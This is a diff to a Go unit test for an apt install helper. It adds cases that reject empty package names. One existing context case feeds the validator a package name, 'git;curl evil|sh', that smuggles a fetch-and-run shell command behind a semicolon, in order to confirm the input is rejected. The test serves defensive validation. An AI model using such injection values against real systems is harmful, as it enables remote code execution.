@@ -144,6 +144,16 @@ func TestGetInstall(t *testing.T) {
 			wantErr:  "apt: install requires at least one package",
 		},
 		{
+			name:     "empty string in packages slice",
+			packages: []string{""},
+			wantErr:  "apt: empty package name in install list",
+		},
+		{
+			name:     "empty string among valid packages",
+			packages: []string{"git", "", "tree"},
+			wantErr:  "apt: empty package name in install list",
+		},
+		{
 			name:     "package with semicolon rejected",
 			packages: []string{"git;curl evil|sh"},
 			wantErr:  "contains disallowed characters",
